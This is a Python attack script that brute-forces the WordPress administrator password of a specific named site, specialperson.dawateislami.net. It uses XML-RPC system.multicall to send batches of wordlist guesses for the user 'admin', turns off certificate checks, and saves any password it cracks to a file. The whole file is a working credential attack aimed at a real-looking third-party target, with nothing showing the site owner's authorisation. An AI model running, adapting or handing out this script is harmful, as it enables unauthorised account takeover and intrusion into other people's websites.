#!/usr/bin/env python3
"""
WordPress XMLRPC Brute Force with Multicall Amplification
Target: specialperson.dawateislami.net
Username: admin (enumerated via REST API)
"""

import requests
import sys
import time
import math
from itertools import islice

requests.packages.urllib3.disable_warnings()

TARGET = "https://specialperson.dawateislami.net/xmlrpc.php"
USERNAME = "admin"
MULTICALL_BATCH = 50  # attempts per HTTP request

def load_wordlist(path):
    with open(path, 'r', errors='ignore') as f:
        words = [line.strip() for line in f if line.strip()]
    return words

def build_multicall(passwords):
    methods = ""
    for pw in passwords:
        methods += f"""
        <value><struct>
          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
          <member><name>params</name><value><array><data>
            <value><array><data>
              <value><string>{USERNAME}</string></value>
              <value><string>{pw}</string></value>
            </data></array></value>
          </data></array></value></member>
        </struct></value>"""

    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>{methods}
    </data></array></value></param>
  </params>
</methodCall>"""

def check_response(xml_text, passwords):
    if "Incorrect username or password" in xml_text:
        return None, False
    if "result" in xml_text and "blogName" in xml_text:
        for i, pw in enumerate(passwords):
            if pw in xml_text:
                return pw, True
        return passwords[0], True
    return None, False

def run_bruteforce(wordlist_path, output_file=None):
    passwords = load_wordlist(wordlist_path)
    total = len(passwords)
    batches = math.ceil(total / MULTICALL_BATCH)

    print(f"Target:    {TARGET}")
    print(f"Username:  {USERNAME}")
    print(f"Method:    XMLRPC system.multicall ({MULTICALL_BATCH} attempts/request)")
    print(f"Wordlist:  {wordlist_path} ({total} passwords)")
    print(f"Batches:   {batches}")
    print(f"\nStarting brute force...\n")

    start = time.time()
    tested = 0
    found = False

    for batch_num in range(batches):
        batch_start = batch_num * MULTICALL_BATCH
        batch = passwords[batch_start:batch_start + MULTICALL_BATCH]

        xml_body = build_multicall(batch)

        try:
            r = requests.post(
                TARGET,
                data=xml_body,
                headers={"Content-Type": "text/xml"},
                verify=False,
                timeout=30
            )

            password, success = check_response(r.text, batch)

            if success:
                elapsed = time.time() - start
                print(f"\n{'='*50}")
                print(f"  PASSWORD FOUND: {password}")
                print(f"  Time: {elapsed:.1f}s | Tested: {tested + len(batch)}")
                print(f"{'='*50}")

                if output_file:
                    with open(output_file, 'w') as f:
                        f.write(f"PASSWORD: {password}\n")
                        f.write(f"USERNAME: {USERNAME}\n")
                        f.write(f"TARGET: {TARGET}\n")
                        f.write(f"TIME: {elapsed:.1f}s\n")
                        f.write(f"TESTED: {tested + len(batch)}\n")
                found = True
                break

        except Exception as e:
            print(f"  [!] Batch {batch_num + 1} error: {e}")
            time.sleep(2)
            continue

        tested += len(batch)
        elapsed = time.time() - start
        rate = tested / elapsed if elapsed > 0 else 0
        eta = (total - tested) / rate if rate > 0 else 0

        if tested % 500 == 0 or tested == total:
            print(f"  [{tested}/{total}] {tested*100//total}% | {rate:.0f}/s | ETA: {eta:.0f}s")

        time.sleep(0.1)

    if not found:
        elapsed = time.time() - start
        print(f"\n[-] Password not found in wordlist.")
        print(f"    Tested {tested}/{total} in {elapsed:.1f}s")

    return found

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="WordPress XMLRPC Brute Force")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
    parser.add_argument("-o", "--output", default="found.txt", help="Output file for found password")
    parser.add_argument("-u", "--username", default="admin", help="Target username (default: admin)")
    parser.add_argument("-b", "--batch", type=int, default=50, help="Passwords per request (default: 50)")

    args = parser.parse_args()
    USERNAME = args.username
    MULTICALL_BATCH = args.batch

    run_bruteforce(args.wordlist, args.output)
